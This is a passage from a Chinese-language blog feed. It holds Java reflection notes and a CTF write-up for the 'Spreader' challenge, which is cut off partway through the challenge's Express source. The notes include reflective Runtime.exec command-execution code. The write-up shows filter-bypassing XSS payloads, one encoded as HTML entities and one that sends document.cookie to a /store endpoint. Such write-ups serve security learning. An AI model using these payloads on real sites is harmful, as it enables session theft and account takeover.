字符串类型路径(必须完整)</span></span><br><span class="line"> &#123;classLoader&#125;.loadClass(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 4. 通过实例获取</span></span><br><span class="line"><span class="type">TargetObject</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TargetObject</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">alunbarClass2</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 举个例子</span></span><br><span class="line"> <span class="keyword">package</span> Reflection;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;Reflection.User&quot;</span>;</span><br><span class="line">         <span class="type">Class</span> <span class="variable">what</span> <span class="operator">=</span> User.class;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="comment">// 需要处理异常</span></span><br><span class="line">             <span class="type">Class</span> <span class="variable">what1</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">             <span class="comment">// 需要处理异常</span></span><br><span class="line">             <span class="type">Class</span> <span class="variable">what2</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(className);</span><br><span class="line">         &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">             System.err.println(<span class="string">&quot;Class not found: &quot;</span> + className);</span><br><span class="line">             e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">         <span class="type">Class</span> <span class="variable">what3</span> <span class="operator">=</span> user.getClass();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="类构造函数"><a href="#类构造函数" class="headerlink" title="类构造函数"></a>类构造函数</h4><ol><li>类型：Constructor</li><li>想获取类的所有构造方法可以使用：clazz.getDeclaredConstructors来获取一个Constructor数组。</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runtimeClass1.getDeclaredConstructor()</span><br><span class="line">runtimeClass1.getConstructor()  <span class="comment">// 无法获取到私有方法 --&gt; 一般使用这个</span></span><br><span class="line">    <span class="comment">// 注意一下权限constructor.setAccessible(true)</span></span><br></pre></td></tr></table></figure><h4 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h4><ol><li>类型: Method</li><li>关于参数<ol><li>method.invoke的第一个参数必须是类实例对象，如果调用的是static方法那么第一个参数值可以传null，因为在java中调用静态方法是不需要有类实例的，因为可以直接类名.方法名(参数)的方式调用。</li><li>method.invoke第二个参数如果有参数那么就<strong>必须严格的依次传入对应的参数类型</strong></li><li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Method.html#invoke-java.lang.Object-java.lang.Object...-">java8文档</a></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 1. 获取类方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> xxx.getMethod(<span class="string">&quot;methodname&quot;</span>,<span class="string">&quot;参数类型&quot;</span>); <span class="comment">// getMethod只能获取到当前类和父类的所有有权限的方法(如：public)</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> xxx.getDeclaredMethod(<span class="string">&quot;方法名&quot;</span>, <span class="string">&quot;参数类型如String.class，多个参数用,号隔开&quot;</span>);   <span class="comment">// getDeclaredMethod能获取到当前类的所有成员方法(不包含父类)</span></span><br><span class="line">    <span class="comment">// +s形式返回一个数组</span></span><br><span class="line"><span class="comment">// 2. 调用类方法，静态第一个参数可以是null</span></span><br><span class="line">method.invoke(方法实例对象, 方法参数值，多个参数值用,隔开);</span><br><span class="line"><span class="comment">// invoke函数原型</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj,</span></span><br><span class="line"><span class="params">                     Object... args)</span></span><br><span class="line">              <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">                     IllegalArgumentException,</span><br><span class="line">                     InvocationTargetException</span><br></pre></td></tr></table></figure><h4 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h4><ol><li>Field</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 先获取字段</span></span><br><span class="line">  <span class="comment">// getField和getDeclaredField的区别同getMethod和getDeclaredMethod</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">fields</span> <span class="operator">=</span> xxx.getDeclaredFields();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span>  <span class="operator">=</span> xxx.getDeclaredField(<span class="string">&quot;变量名&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 获取字段后获取值</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> field.get(类实例对象);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 修改变量</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br><span class="line">    <span class="comment">// 注意权限</span></span><br><span class="line">    field.setAccessible(<span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. final关键字修饰的成员变量 --&gt; 需要先修改</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);    <span class="comment">// 修改成员变量的Field对象的modifiers值，~Modifier.FINAL</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure><h3 id="小试牛刀-反射调用Runtime"><a href="#小试牛刀-反射调用Runtime" class="headerlink" title="小试牛刀: 反射调用Runtime"></a>小试牛刀: 反射调用Runtime</h3><ol><li>先来一个普通写法<code>System.out.println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime.exec(&#39;ls&#39;).getInputStream(),&#39;utf-8&#39;))</code></li><li>使用反射写法<ol><li><strong>不一样的创建实例</strong>: 使用Runtime类的Class对象获取Runtime类的无参数构造方法(getDeclaredConstructor())，因为Runtime的构造方法是private的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限<code>constructor.setAccessible(true)</code></li></ol></li></ol><blockquote><p>练习1: Apache Commons IO 输出运行结果<br>忽略了头文件</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;ls&quot;</span>;</span><br><span class="line"><span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改权限</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> runtimeClass.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取方法并调用方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果并输出，这个写法比较简洁 --&gt; Apache Commons IO：提供更简洁的 API，代码更简洁，但需要引入额外的依赖</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">System.out.println(org.apache.commons.io.IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br></pre></td></tr></table></figure><blockquote><p>练习2: java标准api输出结果</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Reflection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">// test to RCE</span></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">// 1. 创建对象</span></span><br><span class="line">          Class&lt;?&gt; myclass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">          Constructor&lt;?&gt; constructor = myclass.getDeclaredConstructor();</span><br><span class="line">          constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">          <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 2. 获取方法</span></span><br><span class="line">          <span class="comment">// String cmd = &quot;ping 8f1x4d.dnslog.cn&quot;;</span></span><br><span class="line">          <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">          <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> myclass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">          <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) execMethod.invoke(obj,cmd);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 3. 获取方法输出</span></span><br><span class="line">          <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">          <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">          <span class="type">StringBuilder</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">          String line;</span><br><span class="line">          <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">              content.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          System.out.println(content.toString());</span><br><span class="line">          reader.close();</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">          System.err.println((<span class="string">&quot;Class not found: java.lang.Runtime&quot;</span>));</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">          System.err.println((<span class="string">&quot;Method not found: java.lang.Runtime()&quot;</span>));</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Q-A-反射"><a href="#Q-A-反射" class="headerlink" title="*Q&amp;A 反射"></a>*Q&amp;A 反射</h3><h4 id="1-为什么必须使用try-catch"><a href="#1-为什么必须使用try-catch" class="headerlink" title="1. 为什么必须使用try-catch?"></a>1. 为什么必须使用try-catch?</h4><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>泛型<ol><li><a href="https://www.nenggz.com/md/java/basic/java-basic-x-generic.html">详细</a></li></ol></li><li>反射<ol><li><a href="https://www.nenggz.com/md/java/basic/java-basic-x-reflection.html">详细解释</a></li><li>javasec</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spreader_强网拟态24</title>
      <link href="/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/"/>
      <url>/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/</url>
      
        <content type="html"><![CDATA[<h2 id="分析与尝试-ALMOST-DONE"><a href="#分析与尝试-ALMOST-DONE" class="headerlink" title="分析与尝试(ALMOST DONE)"></a>分析与尝试(ALMOST DONE)</h2><ol><li><p>代码分析</p><ol><li>考点应该是xss，下来这么大功夫，不用猜，都明着写了triggerXSS</li><li>看一下代码，将用户存在users列表里，密码明文存储</li><li>访问&#x2F;时进行鉴权，只会显示对应权限的post，可知当role为ROLES.ADMIN时可以看到所有的内容</li><li>访问&#x2F;post时黑名单，可以直接写入content中，admin只可以看到previleged和admin的文章</li><li>任何人都可以获取&#x2F;store的内容，存的是req.body</li><li>显然要读&#x2F;flag内容</li></ol></li><li><p>不是哥们，如果我先做过这题网鼎直接秒了啊，真实艹了，现在轮到我秒你了，还是假装一下</p></li><li><p>目标，通过admin读到flag，然后写在post里或者&#x2F;store回来？也可以是直接带外如果开网的话，通过&#x2F;report_admin让admin来看</p><ol><li><em><strong>attacks(可以的，没有问题)</strong></em>: 普通用户写内容，&#x2F;report_previleged读让&#x2F;report_admin触发admin访问&#x2F;flag读取内容后访问&#x2F;store写入，然后使用本地用户登录并访问&#x2F;store即可</li><li>现在的问题在于<strong>绕过</strong>：检测大小写与全局，特殊函数<code>eval(</code>需要左括号才会被过滤，允许使用href和src但是不能加上恶意东西<ol><li>想到base64编码但是被过滤了，php伪协议+其他编码？source被过滤了</li><li>刚好<code>window[&#39;eval&#39;](atob(data))</code>可以行得通，可打，怎么调用到js –&gt; <em><strong>还是看题解了，不要浪费太多实践</strong></em></li></ol></li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 缺点：需要herf点击，这里行不通</span></span><br><span class="line"><span class="comment">// 返回javascript:后面就是可读内容</span></span><br><span class="line"><span class="comment">// javascript:在herf里才可以，img行不通</span></span><br><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;<span class="variable language_">window</span>[<span class="string">&#x27;eval&#x27;</span>](<span class="title function_">atob</span>(data)) <span class="comment">// 在data中输入base64编码的值</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="bypass-and-payload"><a href="#bypass-and-payload" class="headerlink" title="***bypass and payload"></a>***bypass and payload</h2><ol><li><p>bypass: 这里使用了<em><strong>html自动闭合</strong></em>的特性调用js，使用<em><strong>实体编码</strong></em>来绕过关键词</p><ol><li>这里如果使用python发包的话，可以抓包看看是x-www-urlencoded或者是application&#x2F;json</li></ol> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- poc 成功调用alert() --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;<span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3b;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x2c;</span>YWxlcnQoKQ==&quot;</span>&gt;</span>&lt;/script</span><br></pre></td></tr></table></figure></li><li><p>paylaod</p><ol><li><p>打cookie写法，标签未闭合绕过</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 获取previlegedcookie</span></span><br><span class="line">&lt;script&gt;<span class="variable language_">window</span>[<span class="string">&#x27;alert&#x27;</span>](<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script</span><br><span class="line"><span class="comment">// 2. 不出网，上传后/report_privileged写入&#x27;/store&#x27;带出cookie</span></span><br><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;/store&#x27;</span>,&#123;<span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,<span class="attr">headers</span>:&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,<span class="attr">body</span>:<span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&#125;);&lt;/script</span><br><span class="line"><span class="comment">// 3. 登录previleged，同理上传后/report_privileged</span></span><br><span class="line"><span class="comment">// 4. 获取cookie访问/flag</span></span><br></pre></td></tr></table></figure></li><li><p>写入载体法略，总之js写一下在键值中再写一次就好</p></li></ol></li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; triggerXSS &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../bot&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Store</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isAuthenticated</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">(<span class="params">users,posts,store,AdminPassWord,PrivilegedPassWord</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ROLES</span> = &#123;</span><br><span class="line">        <span class="attr">PLAIN</span>: <span class="string">&quot;plain&quot;</span>,</span><br><span class="line">        <span class="attr">PRIVILEGED</span>: <span class="string">&quot;privileged&quot;</span>,</span><br><span class="line">        <span class="attr">ADMIN</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(<span class="string">&#x27;register.html&#x27;</span>, &#123; <span class="attr">root</span>: <span class="string">&#x27;./views&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; username, password, role &#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> userExists = users.<span class="title function_">some</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username);</span><br><span class="line">        <span class="keyword">if</span> (userExists) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Username already exists!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        users.<span class="title function_">push</span>(&#123; username, password, <span class="attr">role</span>: <span class="string">&quot;plain&quot;</span> &#125;);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(<span class="string">&#x27;login.html&#x27;</span>, &#123; <span class="attr">root</span>: <span class="string">&#x27;./views&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(password);</span><br><span class="line">        <span class="keyword">const</span> user = users.<span class="title function_">find</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username &amp;&amp; u.<span class="property">password</span> === password);</span><br><span class="line">        <span class="keyword">if</span> (user) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">user</span> = user;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> 